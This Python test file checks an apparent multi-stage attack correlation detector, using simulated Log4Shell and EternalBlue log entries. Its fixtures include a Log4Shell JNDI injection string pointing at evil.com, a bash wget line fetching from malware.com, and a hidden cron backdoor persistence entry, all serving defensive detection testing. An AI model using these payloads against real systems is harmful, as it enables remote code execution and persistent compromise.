"""
Correlation Tests

Tests multi-stage attack detection and temporal correlation.
"""

import pytest
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from src.bloom.bloom_config import BloomConfig
from src.signatures.cve_loader import CVELoader
from src.processors.log_processor import LogProcessor


class TestMultiStageCorrelation:
    """Test multi-stage attack correlation"""

    @pytest.fixture
    def setup_system(self):
        """Setup APT detection system"""
        base_path = Path(__file__).parent.parent
        signatures_path = base_path / "data/signatures/cve_signatures.json"

        config = BloomConfig()
        cve_loader = CVELoader(str(signatures_path))
        processor = LogProcessor(cve_loader, config)

        return processor

    def test_log4shell_single_stage(self, setup_system):
        """Test detection of isolated Log4Shell stage 1"""
        processor = setup_system

        log = {
            'timestamp': '2024-10-01T10:00:00Z',
            'source_ip': '10.0.1.5',
            'target': 'nginx:1.19',
            'log': 'GET /api?q=${jndi:ldap://evil.com}'
        }

        alert = processor.process_log(log)

        # Should generate Tier 1 alert (isolated event)
        assert alert is not None
        assert alert.tier == 1
        assert alert.cve_id == 'CVE-2021-44228'
        assert len(alert.attack_chain) == 1

    def test_log4shell_two_stage(self, setup_system):
        """Test detection of Log4Shell 2-stage attack"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': 'GET /api?q=${jndi:ldap://evil.com}'
            },
            {
                'timestamp': '2024-10-12T14:30:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': 'POST /upload - Runtime.exec detected in payload'
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Should detect 2-stage attack
        assert len(alerts) >= 2
        final_alert = alerts[-1]
        assert final_alert.tier == 2
        assert len(final_alert.attack_chain) == 2
        assert final_alert.time_span_days > 0

    def test_log4shell_three_stage_apt(self, setup_system):
        """Test detection of Log4Shell 3-stage APT campaign"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': 'GET /api?q=${jndi:ldap://evil.com}'
            },
            {
                'timestamp': '2024-10-12T14:30:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': 'Runtime.exec /bin/bash -c wget http://malware.com'
            },
            {
                'timestamp': '2024-11-04T04:15:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': 'crontab entry added: @reboot /tmp/.hidden/backdoor.sh'
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Should detect 3-stage APT campaign
        assert len(alerts) >= 3
        final_alert = alerts[-1]
        assert final_alert.tier == 3  # CRITICAL
        assert final_alert.severity == 'CRITICAL'
        assert len(final_alert.attack_chain) == 3
        assert final_alert.time_span_days >= 30  # ~33 days

    def test_unlimited_time_window(self, setup_system):
        """Test correlation across extended time periods (45+ days)"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': '${jndi:ldap://evil.com}'
            },
            {
                'timestamp': '2024-11-15T14:30:00Z',  # 45 days later
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': 'Runtime.exec detected'
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Should still correlate despite 45-day gap
        final_alert = alerts[-1]
        assert final_alert.tier >= 2
        assert final_alert.time_span_days >= 45

    def test_multiple_cves_independent(self, setup_system):
        """Test that different CVEs are tracked independently"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': '${jndi:ldap://evil.com}'  # Log4Shell
            },
            {
                'timestamp': '2024-10-02T11:00:00Z',
                'source_ip': '10.0.2.10',
                'target': 'file-server',
                'log': 'SMB1 \\\\PIPE\\\\ NT_STATUS_INSUFF_SERVER_RESOURCES'  # EternalBlue
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Should generate separate alerts for different CVEs
        assert len(alerts) == 2
        assert alerts[0].cve_id != alerts[1].cve_id

    def test_same_cve_different_targets(self, setup_system):
        """Test that same CVE against different targets are tracked separately"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'nginx:1.19',
                'log': '${jndi:ldap://evil.com}'
            },
            {
                'timestamp': '2024-10-01T11:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'apache:2.4',  # Different target
                'log': '${jndi:ldap://evil.com}'
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Should track as separate campaigns
        assert len(alerts) == 2
        assert alerts[0].correlation_key != alerts[1].correlation_key

    def test_benign_logs_no_alerts(self, setup_system):
        """Test that benign logs don't generate alerts"""
        processor = setup_system

        benign_logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '192.168.1.100',
                'target': 'web-server',
                'log': 'GET /index.html HTTP/1.1 200 OK'
            },
            {
                'timestamp': '2024-10-01T11:00:00Z',
                'source_ip': '192.168.1.100',
                'target': 'web-server',
                'log': 'Normal database query SELECT * FROM users'
            }
        ]

        alerts = []
        for log in benign_logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Should not generate any alerts
        assert len(alerts) == 0


class TestCampaignTracking:
    """Test campaign tracking and correlation"""

    @pytest.fixture
    def setup_system(self):
        """Setup APT detection system"""
        base_path = Path(__file__).parent.parent
        signatures_path = base_path / "data/signatures/cve_signatures.json"

        config = BloomConfig()
        cve_loader = CVELoader(str(signatures_path))
        processor = LogProcessor(cve_loader, config)

        return processor

    def test_campaign_progression(self, setup_system):
        """Test campaign stage progression tracking"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'server',
                'log': '${jndi:ldap://evil.com}'
            },
            {
                'timestamp': '2024-10-05T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'server',
                'log': 'Runtime.exec detected'
            },
            {
                'timestamp': '2024-10-10T10:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'server',
                'log': 'crontab @reboot'
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        # Verify progression
        assert alerts[0].tier == 1  # First stage
        assert alerts[1].tier == 2  # Two stages
        assert alerts[2].tier == 3  # Three stages (APT)

        # All should have same correlation key
        corr_keys = [a.correlation_key for a in alerts]
        assert len(set(corr_keys)) == 1

    def test_campaign_time_span_tracking(self, setup_system):
        """Test accurate time span calculation"""
        processor = setup_system

        logs = [
            {
                'timestamp': '2024-10-01T00:00:00Z',
                'source_ip': '10.0.1.5',
                'target': 'server',
                'log': '${jndi:ldap://evil.com}'
            },
            {
                'timestamp': '2024-10-31T23:59:59Z',  # Exactly 30 days later
                'source_ip': '10.0.1.5',
                'target': 'server',
                'log': 'Runtime.exec detected'
            }
        ]

        alerts = []
        for log in logs:
            alert = processor.process_log(log)
            if alert:
                alerts.append(alert)

        final_alert = alerts[-1]
        assert final_alert.time_span_days >= 30
        assert final_alert.time_span_days < 31


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, '-v'])
